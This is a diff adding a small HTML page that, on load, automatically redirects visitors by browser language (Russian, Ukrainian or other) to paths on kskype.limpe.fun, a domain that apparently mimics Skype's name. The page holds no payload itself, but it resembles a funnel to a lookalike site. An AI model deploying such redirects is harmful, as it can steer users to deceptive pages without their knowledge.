@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Language Redirect</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var userLang = navigator.language || navigator.userLanguage;
+            var redirectUrl;
+
+            if (userLang.startsWith('ru')) {
+                redirectUrl = 'https://kskype.limpe.fun/ru';
+            } else if (userLang.startsWith('uk')) {
+                redirectUrl = 'https://kskype.limpe.fun/ua';
+            } else {
+                redirectUrl = 'https://kskype.limpe.fun/en';
+            }
+
+            window.location.href = redirectUrl;
+        });
+    </script>
+</head>
+<body>
+    <p>Redirecting based on your browser language...</p>
+</body>
+</html>
